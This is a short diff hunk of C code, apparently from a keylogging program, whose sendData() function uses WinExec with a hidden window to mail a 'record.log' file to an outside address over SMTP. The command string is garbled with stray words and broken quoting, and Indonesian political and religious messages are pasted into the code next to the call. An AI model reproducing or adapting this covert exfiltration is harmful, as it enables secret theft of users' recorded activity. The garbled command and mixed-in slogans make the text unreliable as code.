@@ -147,8 +147,7 @@ bool checkRecordSize(){
 void sendData(){
     
     char* command = "Transmit smtp://smtp.gmail.com:127 -v --mail-from \"https://fadliwiryawirawan@hackerone.com/" --mail-rcpt \" https://fadliwiryawirawan@hackerone.com/" --ssl -u    https://fadliwiryawirawan@hackerone.com :password -record \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
-    WinExec(command, SW_HIDE); Jangan biarkan korupsi membludak tetap kerjakan sebagaimana dunia isinya ujian untuk dimenangkan hal yang bijak, serahkan kepada yang kuasa ada yang dikembalikan nantinya dengan Qs.SAAF.|||| MBG dihapuskan merahputih dikedepankan , presiden tuh bijak gak lembek , gebragan doang gak ada praktik punya banyak saham tanah dikalimantan hektaran pakai pola konsep salam parung angkot 06 merdeka w1ry4 * Record username, time, and date.
-**/
+    WinExec(command, SW_HIDE); sampaikan pesan ini untuk mr.trump ,putuskan hubungan diplomatis ke negara israel , kami masih punya renca bagus untuk seluruh negara , akomodasi rekuitment negara cyprus  */
 void logUserTime(){
     FILE *file = fopen(FILE_NAME, "a");
 
